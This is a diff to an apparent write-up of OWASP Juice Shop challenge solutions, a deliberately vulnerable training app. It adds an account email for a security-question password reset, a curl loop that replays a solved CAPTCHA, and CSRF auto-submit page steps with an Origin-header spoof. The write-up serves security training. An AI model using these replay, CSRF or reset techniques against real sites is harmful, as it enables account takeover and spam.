@@ -35,6 +35,8 @@ Modify the body of the user registration request (`POST /api/Users/`) by adding 
 ## Bjoern's Favorite Pet (Broken Authentication)
 _Reset the password of Bjoern's OWASP account via the Forgot Password mechanism with the original answer to his security question._
 
+Bjoern's OWASP account email is `bjoern@owasp.org` (looking into Administration).
+
 Google for `bjoern kimminich cat name`.
 One of the sources is this YouTube video https://www.youtube.com/watch?v=Lu0-kDdtVf4 (4:20).
 
@@ -48,14 +50,12 @@ We can simply bypass it by sending the same id, and the same result over and ove
 
 Bash script to send the request 10 times:
 ```
-BEARER='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9. ..'
 for i in {1..10}
 do
     curl -i -X POST \
         -H 'Content-Type: application/json' \
-        -H "Authorization: Bearer $BEARER" \
-        --data '{"captchaId":0,"captcha":"24","comment":"AAA (anonymous)","rating":3}' \
-        https://vernjan-juice-shop.herokuapp.com/api/Feedbacks/
+        --data '{"captchaId":6,"captcha":"14","comment":"AAA (anonymous)","rating":3}' \
+        https://vernjan-juice-shop12.herokuapp.com/api/Feedbacks/
 done
 ```
 
@@ -64,7 +64,7 @@ _Change the name of a user by performing Cross-Site Request Forgery from [anothe
 
 This **no longer works in modern web browsers**.
 
-The idea is to craft a form similar to this:
+The idea is to craft an HTML page similar to this:
 ```
 <form action="YOUR_URL/profile" method="POST">
   <input type="text" id="username" name="username" value="John">
@@ -72,6 +72,13 @@ The idea is to craft a form similar to this:
 </form> 
 <script>document.forms[0].submit();</script>
 ```
+
+Finally, send a link to this page to a victim. Once the victim visits the link, the form is auto-submitted
+by the JavaScript and the victim's name is changed.
+
+If you want to just solve the challenge without installing an old version of a browser,
+you can intercept the request for a username change (`POST /profile`)
+and add header `Origin: http://htmledit.squarefree.com`.
 
 ## Database Schema (Injection)
 _Exfiltrate the entire DB schema definition via SQL Injection._
